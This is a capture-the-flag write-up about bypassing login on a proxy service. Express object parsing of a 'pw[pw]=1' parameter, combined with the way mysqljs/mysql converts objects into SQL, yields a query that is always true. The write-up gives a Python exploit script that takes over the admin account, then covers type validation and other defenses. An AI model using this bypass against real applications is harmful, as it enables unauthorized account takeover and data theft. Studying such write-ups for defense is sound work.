# ≅ CProxy: Inject - SQL Injection Writeup

## Description

An online proxy service `CProxy` that allows sending HTTP requests to arbitrary websites and checking responses.

**Objective**: Compromise the `admin_inject` account and exfiltrate proxy response records to obtain the flag!

---

## Background

This challenge involves exploiting a **SQL Injection** vulnerability through Express.js parameter parsing and MySQL library characteristics.

## Code Analysis

### Target Endpoint: `/auth`

```javascript
app.post('/auth', async (req, res) => {
    const {id, pw} = req.body;
    const isRegister = 'register' in req.body;

    if (isRegister) {
        // Registration logic
    } else {
        const uid = await db.doLogin(id, pw);
        if (uid !== undefined) {
            req.session.uid = uid;
            return res.redirect('/');
        } else {
            return res.sendStatus(401);
        }
    }
});
```

### Vulnerable Function: `doLogin()`

```javascript
async function doLogin(id, pw) {
    try {
        const result = await query("SELECT * FROM users WHERE id = ? AND pw = ?", [id, pw]);
        if (result.length === 1) {
            return result[0]._id;
        }
    } catch {}
}
```

### Database Setup

From `2_flag_inject.sql`:
```sql
USE `cproxy`;

INSERT INTO users (_id, id, pw) VALUES (1, 'admin_inject', 'fake_pw_inject');
INSERT INTO responses (_id, uid, res) VALUES (1, 1, '{"status":200,"statusText":"OK","headers":{},"data":"DH{sample_flag_inject}","url":"flag_inject"}');
```

### Express Configuration

```javascript
// ✅ Key vulnerability: Object parsing enabled
app.use(express.urlencoded()); // extended: true by default
// This allows pw[pw]=1 → req.body.pw = {pw: 1}
```

## Vulnerability Analysis

### Root Cause

1. **Express.js Parameter Parsing**: `express.urlencoded()` with `extended: true` (default) allows object/array parsing
2. **No Type Validation**: The code doesn't verify if `pw` is a string
3. **MySQL Library Behavior**: `mysqljs/mysql` library converts objects to SQL without `stringifyObjects` option
4. **SQL Logic Manipulation**: Object parameters can manipulate SQL query logic

### Attack Vector

The attack exploits the combination of:
- Express object parsing: `pw[pw]=1` → `{pw: 1}`
- MySQL object-to-SQL conversion: `{pw: 1}` → `'pw' = 1`
- SQL operator precedence: `pw = 'pw' = 1` → `(pw = pw) = 1` → `true = 1` → `true`

## Exploitation

### Step-by-Step Attack Flow

#### 1. HTTP Request
```http
POST /auth HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=admin_inject&pw[pw]=1
```

#### 2. Express Parsing
```javascript
// After app.use(express.urlencoded()) processing
req.body = {
    id: "admin_inject",
    pw: {pw: 1}  // ✅ Parsed as object!
}
```

#### 3. MySQL Library Processing
```javascript
// doLogin function execution
const result = await query("SELECT * FROM users WHERE id = ? AND pw = ?", [id, {pw: 1}]);

// MySQL library converts object to SQL:
// {pw: 1} → 'pw' = 1

// Final SQL query:
"SELECT * FROM users WHERE id = 'admin_inject' AND pw = 'pw' = 1"
```

#### 4. SQL Evaluation
```sql
-- Original intended query
SELECT * FROM users WHERE id = 'admin_inject' AND pw = 'fake_pw_inject'

-- Actual executed query  
SELECT * FROM users WHERE id = 'admin_inject' AND pw = 'pw' = 1

-- SQL operator precedence evaluation:
-- pw = 'pw' = 1 becomes (pw = pw) = 1
-- (pw = pw) always evaluates to true
-- true = 1 evaluates to true in MySQL
-- Final condition: TRUE ✅
```

#### 5. Session Creation
```javascript
// doLogin returns admin_inject's _id (1)
req.session.uid = 1; // Admin session established
```

#### 6. Flag Retrieval
```javascript
// Access admin's response history
GET /api/history/1
// Returns: {"status":200,"statusText":"OK","headers":{},"data":"DH{sample_flag_inject}","url":"flag_inject"}
```

### Exploit Code

```python
import requests

URL = 'http://target:port'

# SQL Injection payload
auth_data = {
    'id': 'admin_inject',
    'pw[pw]': 1  # Key: Object parameter injection
}

r = requests.Session()
r.post(URL + '/auth', data=auth_data).raise_for_status()

# Retrieve flag from admin's response history
flag = r.get(URL + '/api/history/1').json()['data']
print(f"Flag: {flag}")
```

### Why This Specific Payload Works

#### Successful Cases
- `pw[pw]=1` → `pw = pw = 1` → `true = 1` → `true` ✅
- Only works when key name matches column name AND value equals 1

#### Failed Cases
- `pw[hello]=1` → `pw = 'hello' = 1` → `false = 1` → `false` ❌
- `pw[pw]=0` → `pw = pw = 0` → `true = 0` → `false` ❌
- `pw[pw]=2` → `pw = pw = 2` → `true = 2` → `false` ❌

## Key Takeaways

### Technical Insights

1. **Object Parameter Injection**: Express.js can parse `field[key]=value` into nested objects
2. **MySQL Library Quirks**: `mysqljs/mysql` converts objects to SQL expressions without proper escaping
3. **SQL Operator Precedence**: Understanding how `=` operators are evaluated in MySQL
4. **Self-Reference Logic**: `column = column` always evaluates to true

### Security Implications

1. **Input Type Validation**: Always validate parameter types before database operations
2. **Express Configuration**: Consider using `express.urlencoded({extended: false})` to prevent object parsing
3. **Database Library Settings**: Ensure proper configuration of SQL escaping options
4. **Prepared Statements**: Use actual prepared statements rather than string interpolation

### Defense Strategies

```javascript
// 1. Type validation
if (typeof id !== 'string' || typeof pw !== 'string') {
    return res.status(400).send('Invalid input types');
}

// 2. Disable object parsing
app.use(express.urlencoded({extended: false}));

// 3. Use proper prepared statements
// Consider using libraries with better SQL injection protection
```

## Conclusion

This challenge demonstrates a sophisticated SQL injection technique that exploits the interaction between Express.js parameter parsing and MySQL library behavior. The attack requires understanding of:

- Web framework internals (Express.js)
- Database library behavior (mysqljs/mysql)
- SQL operator precedence and evaluation
- Object-to-SQL conversion mechanisms

The vulnerability highlights the importance of input validation and understanding the security implications of framework default configurations.
